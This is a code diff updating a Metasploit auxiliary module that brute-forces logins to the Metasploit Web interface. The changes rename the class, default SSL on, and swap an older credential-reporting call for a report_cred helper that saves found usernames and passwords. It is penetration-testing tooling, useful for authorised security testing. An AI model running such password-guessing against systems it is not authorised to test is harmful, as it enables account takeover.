@@ -1,12 +1,9 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-
-class Metasploit3 < Msf::Auxiliary
-
+class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Report
   include Msf::Auxiliary::AuthBrute
@@ -21,7 +18,8 @@ class Metasploit3 < Msf::Auxiliary
         web interface using a specific user/pass.
       },
       'Author'         => [ 'Vlatko Kosturjak <kost[at]linux.hr>' ],
-      'License'        => MSF_LICENSE
+      'License'        => MSF_LICENSE,
+      'DefaultOptions' => { 'SSL' => true }
     )
 
     register_options(
@@ -30,8 +28,7 @@ class Metasploit3 < Msf::Auxiliary
         OptString.new('URILOGIN', [true, "URI for Metasploit Web login. Default is /login", "/login"]),
         OptString.new('URIGUESS', [true, "URI for Metasploit Web login. Default is /user_sessions", "/user_sessions"]),
         OptBool.new('BLANK_PASSWORDS', [false, "Try blank passwords for all users", false]),
-        OptBool.new('SSL', [ true, "Negotiate SSL for outgoing connections", true])
-      ], self.class)
+      ])
 
     register_autofilter_ports([55553])
   end
@@ -124,21 +121,46 @@ class Metasploit3 < Msf::Auxiliary
       else
         print_good("SUCCESSFUL LOGIN. '#{user}' : '#{pass}'")
 
-        report_hash = {
-          :host   => datastore['RHOST'],
-          :port   => datastore['RPORT'],
-          :sname  => 'msf-web',
-          :user   => user,
-          :pass   => pass,
-          :active => true,
-          :type => 'password'}
-
-        report_auth_info(report_hash)
+        report_cred(
+          ip: datastore['RHOST'],
+          port: datastore['RPORT'],
+          service_name: 'msf-web',
+          user: user,
+          password: pass,
+          proof: res.headers['Location']
+        )
         return :next_user
       end
     rescue ::Rex::ConnectionError, Errno::ECONNREFUSED, Errno::ETIMEDOUT
       print_error("HTTP Connection Failed, Aborting")
       return :abort
     end
+  end
+
+  def report_cred(opts)
+    service_data = {
+      address: opts[:ip],
+      port: opts[:port],
+      service_name: opts[:service_name],
+      protocol: 'tcp',
+      workspace_id: myworkspace_id
+    }
+
+    credential_data = {
+      origin_type: :service,
+      module_fullname: fullname,
+      username: opts[:user],
+      private_data: opts[:password],
+      private_type: :password
+    }.merge(service_data)
+
+    login_data = {
+      last_attempted_at: Time.now,
+      core: create_credential(credential_data),
+      status: Metasploit::Model::Login::Status::SUCCESSFUL,
+      proof: opts[:proof]
+    }.merge(service_data)
+
+    create_credential_login(login_data)
   end
 end
